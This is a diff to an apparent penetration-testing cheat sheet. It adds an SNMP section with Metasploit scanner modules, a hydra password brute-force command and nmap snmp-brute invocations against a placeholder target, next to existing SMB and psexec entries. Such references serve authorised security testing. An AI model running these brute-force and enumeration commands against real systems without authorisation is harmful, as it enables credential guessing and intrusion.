@@ -20,7 +20,20 @@ auxiliary/scanner/smb/smb_login
 use auxiliary/scanner/smb/smb_enumusers
 exploit/windows/smb/psexec 
 ```
+### SNMP Service Exploit
 
+```
+auxiliary/scanner/snmp/snmp_login 
+auxiliary/scanner/snmp/snmp_enumusers
+auxiliary/scanner/snmp/snmp_enumshares
+auxiliary/scanner/snmp/snmp_enum
+
+hydra -P pass.txt  <Target> snmp 
+nmap -sU -v --script snmp-brute --script-args passdb=passwords.lst <Target>  
+nmap -sU -v --script snmp-brute --script-args userdb=usernames.lst,passdb=passwords.lst <Target> 
+
+
+```
 
 ### MSSQL
 
